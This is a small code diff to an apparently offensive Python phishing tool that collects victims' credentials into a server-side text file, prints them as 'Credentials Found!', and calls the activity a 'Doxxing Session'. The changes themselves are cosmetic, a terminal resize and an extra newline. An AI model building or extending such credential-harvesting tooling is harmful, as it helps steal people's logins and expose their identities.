@@ -24,6 +24,7 @@ C = '\033[36m' # cyan
 W = '\033[0m'  # white
 LM = '\033[1;95;5m' # light magenta blink
 
+os.system('resize -s 27 90 > /dev/null &')
 swd = os.getcwd()
 os.chdir(swd)
 usern = '{}/SERVER/php/usernames.txt'.format(swd)
@@ -362,7 +363,7 @@ def creds():
             with open(usern, 'r') as credkey:
                 cred_line = credkey.read().rstrip()
                 if len(cred_line) != 0:
-                    print('\n{1}[{3}!{1}]{0} Credentials Found!\n{2}{4}'.format(G, C, cred_line, R, W))
+                    print('\n{1}[{3}!{1}]{0} Credentials Found!\n\n{2}{4}'.format(G, C, cred_line, R, W))
                     time.sleep(2)
                     print(R + "\n[!] " + C + "Restarting Doxxing Session..." + W)
                     os.system('rm -rf SERVER/php/usernames.txt && rm -rf SERVER/php/Log.log && touch SERVER/php/usernames.txt')
